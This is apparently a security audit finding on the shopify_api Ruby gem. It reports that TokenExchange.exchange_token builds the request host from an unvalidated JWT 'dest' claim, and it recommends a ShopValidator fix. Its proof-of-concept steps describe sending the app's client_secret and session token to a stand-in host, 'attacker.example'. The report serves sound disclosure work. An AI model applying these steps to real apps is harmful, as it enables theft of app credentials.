### Title
SSRF with `client_secret` via unvalidated JWT `dest` claim in `TokenExchange.exchange_token` - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`TokenExchange.exchange_token` builds the shop used for the credential-bearing `access_token` request directly from the JWT session token's `dest` claim, without passing it through `Utils::ShopValidator.sanitize!` — unlike every other credential-issuing code path in the gem (`ClientCredentials.client_credentials`, `TokenExchange.migrate_to_expiring_token`, both of which call `ShopValidator.sanitize!` before using the shop to build the request host).

### Finding Description
`HttpClient#initialize` builds the request host directly from `session.shop`: `@base_uri = "https://#{api_host || session.shop}"` [1](#0-0) . This is the same host that receives `client_secret` in the POST body for the token-exchange grant.

In `exchange_token`, the shop is taken from `jwt_payload.shop` (the `dest` claim) and used unvalidated to construct the `Session` that drives `HttpClient`: [2](#0-1) 

`JwtPayload` only checks that `aud` equals the app's `api_key`; it performs no check that `dest`/`shop` is a trusted `*.myshopify.com` (or other trusted) domain: [3](#0-2) 

Contrast this with the sibling methods that build the same kind of credential-bearing request but explicitly sanitize the shop first: [4](#0-3) [5](#0-4) 

The identity binding that should hold is: `host that receives client_secret == a value validated by ShopValidator.TRUSTED_SHOPIFY_DOMAINS`. In `exchange_token` this binding is broken: the host that receives `client_secret` is instead bound only to "whatever string appears in the `dest` claim of a token signed with `api_secret_key`."

### Impact Explanation
Because a session token is signed only with the app's own `api_secret_key` (HS256) and the only claim check performed is `aud == Context.api_key`, this reduces to: any token producer able to obtain a validly-signed session token for the target app's `api_key`/secret pair (e.g., the app's own front end, or any party who can otherwise get such a token issued, such as through an unrelated flaw or a compromised iframe context) controls the `dest` string that ultimately becomes the SSRF target host for a request carrying the app's `client_id`/`client_secret`. Unlike `client_credentials`/`migrate_to_expiring_token`, there is no server-side allow-listing of the destination host to `myshopify.com`/`myshopify.io`/`spin.dev`/etc., so a crafted `dest` (e.g., `attacker.example` or `attacker.example/admin` style values which `gsub("https://", "")` will not normalize) is passed straight into `https://#{shop}/admin/oauth/access_token`, causing the gem to POST the app's `client_secret` and the subject session token to an attacker-controlled host — credential leakage / SSRF carrying the app's credentials.

### Likelihood Explanation
Session tokens are meant to be Shopify-issued and scoped to the `aud`, but nothing in `JwtPayload` binds `dest` to a Shopify-controlled domain shape the way `ShopValidator` does for the other OAuth-adjacent flows. This is a genuine inconsistency in the codebase's own trust model — every other place that turns a caller-supplied shop string into a request host treats that string as attacker-influenced and sanitizes it; `exchange_token` alone does not, despite consuming a claim (`dest`) that is not cryptographically bound to a domain allow-list.

### Recommendation
In `TokenExchange.exchange_token`, run `dest_shop` through `Utils::ShopValidator.sanitize!` (as already done in `client_credentials` and `migrate_to_expiring_token`) before constructing `shop_session`, and raise `Errors::InvalidShopError` if it does not match a trusted Shopify domain.

### Proof of Concept
1. Obtain (or induce issuance of) a JWT session token whose payload has `aud == <victim app's api_key>` and `dest == "attacker.example"`, signed with the victim app's known/shared `api_secret_key` (the same secret used by the embedded app's JS bridge to validate/issue tokens in the flow this gem expects).
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `JwtPayload.new(token)` succeeds because only `aud` is checked [6](#0-5) .
4. `dest_shop` becomes `"attacker.example"`, `Session.new(shop: "attacker.example")` is built with no `ShopValidator` check [7](#0-6) .
5. `HttpClient.new(session: shop_session, ...)` sets `@base_uri = "https://attacker.example"` [1](#0-0) .
6. `client.request(...)` POSTs `{client_id, client_secret, subject_token, ...}` to `https://attacker.example/admin/oauth/access_token`, exfiltrating the app's `client_secret` and the raw session token to the attacker's server.
